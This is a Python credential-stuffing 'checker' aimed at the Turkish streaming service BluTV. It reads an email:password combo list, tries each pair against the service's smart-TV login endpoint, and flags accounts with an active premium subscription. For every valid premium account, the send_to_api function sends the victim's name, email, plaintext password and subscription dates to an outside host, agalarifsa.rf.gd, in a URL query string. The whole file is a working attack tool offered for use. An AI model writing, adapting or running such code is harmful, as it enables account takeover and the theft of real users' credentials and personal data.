import requests
import json
from datetime import datetime
import pytz
import time
import os

INPUT_FILE = "blutvcombo.txt"
TEMP_FILE = "temp_blutvcombo.txt"

login_url = "https://smarttv.blutv.com.tr/actions/account/login"
login_headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "deviceid": "Windows:Chrome:94.0.4606.71",
    "deviceresolution": "1366x768",
    "origin": "https://www.blutv.com",
    "sec-ch-ua": '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36"
}

api_headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    "Cache-Control": "max-age=0",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10;K) AppleWebKit/537.36(KHTML, like Gecko)Chrome/132.0.0.0 MobileSafari/537.36"
}

def format_date(date_str):
    try:
        return datetime.strptime(date_str.split("T")[0], "%Y-%m-%d").strftime("%Y-%m-%d")
    except:
        return None

def get_turkey_date():
    turkey_tz = pytz.timezone("Europe/Istanbul")
    return datetime.now(turkey_tz).strftime("%Y-%m-%d")

def send_to_api(data):
    api_url = f"http://agalarifsa.rf.gd/api/blutv.php?firstname={data['FirstName']}&lastname={data['LastName']}&email={data['Email']}&password={data['Password']}&price={data['Price']}&start_date={data['StartDate']}&end_date={data['EndDate']}"
    try:
        response = requests.get(api_url, headers=api_headers, timeout=30)
        return response.text
    except Exception as e:
        return f"API Hatası: {str(e)}"

def print_account_status(email, status, details=None, api_response=None):
    print("\n" + "="*50)
    print(f"Email: {email}")
    print(f"Durum: {status}")
    if details:
        print("\nHesap Detayları:")
        for key, value in details.items():
            print(f"{key}: {value}")
    if api_response:
        print("\nAPI Yanıtı:", api_response)
    print("="*50 + "\n")

def is_valid_premium_account(account_details):
    # Tüm kritik alanlar dolu ve geçerli mi kontrolü
    required_fields = {
        "Abonelik Türü": account_details.get("Price"),
        "Başlangıç Tarihi": account_details.get("StartDate"),
        "Bitiş Tarihi": account_details.get("EndDate")
    }
    
    # Eksik veya None olan alanları kontrol et
    missing_fields = [field for field, value in required_fields.items() if not value]
    if missing_fields:
        account_details["Hata"] = f"Eksik Alanlar: {', '.join(missing_fields)}"
        return False
    
    # Bitiş tarihi geçerli mi kontrol et
    if account_details["EndDate"] < get_turkey_date():
        account_details["Hata"] = "Abonelik süresi dolmuş"
        return False
    
    return True

def process_account(email, password):
    data = {"username": email, "password": password, "platform": "com.blu.smarttv"}
    
    try:
        response = requests.post(login_url, headers=login_headers, data=data, timeout=30)
        
        if response.status_code != 200:
            print_account_status(email, "Hatalı Giriş", {"HTTP Kodu": response.status_code})
            return False

        result = response.json()
        
        if result.get("status") != "ok":
            print_account_status(email, "Hatalı Giriş", {"Hata Mesajı": result.get("message", "Bilinmeyen hata")})
            return False

        user_data = result.get("user", {})
        
        account_details = {
            "Ad": user_data.get("FirstName", "Bilinmiyor"),
            "Soyad": user_data.get("LastName", "Bilinmiyor"),
            "Email": email,
            "Password": password,
            "Price": user_data.get("Price"),
            "StartDate": format_date(user_data.get("StartDate", "")),
            "EndDate": format_date(user_data.get("EndDate", ""))
        }

        if is_valid_premium_account(account_details):
            print_account_status(email, "PREMIUM Hesap", account_details)
            api_response = send_to_api(account_details)
            print_account_status(email, "API Gönderildi", api_response=api_response)
            return True
        else:
            print_account_status(email, "FREE Hesap", account_details)
            return False

    except requests.exceptions.Timeout:
        print_account_status(email, "Timeout Hatası", {"Hata": "30 saniye içinde yanıt alınamadı"})
        return False
    except Exception as e:
        print_account_status(email, "İşlem Hatası", {"Hata": str(e)})
        return False

def remove_line_from_file(line_to_remove):
    with open(INPUT_FILE, "r") as input_file, open(TEMP_FILE, "w") as temp_file:
        kept_lines = [line for line in input_file if line.strip() != line_to_remove.strip()]
        temp_file.writelines(kept_lines)
    
    os.replace(TEMP_FILE, INPUT_FILE)

def main():
    if not os.path.exists(INPUT_FILE):
        print(f"{INPUT_FILE} dosyası bulunamadı!")
        return

    while True:
        with open(INPUT_FILE, "r") as file:
            lines = file.readlines()
        
        if not lines:
            print("Tüm hesaplar işlendi.")
            break

        first_line = lines[0].strip()
        if not first_line or ":" not in first_line:
            remove_line_from_file(first_line)
            continue

        email, password = first_line.split(":", 1)
        email, password = email.strip(), password.strip()

        process_account(email, password)
        remove_line_from_file(first_line)
        time.sleep(6)

if __name__ == "__main__":
    main()
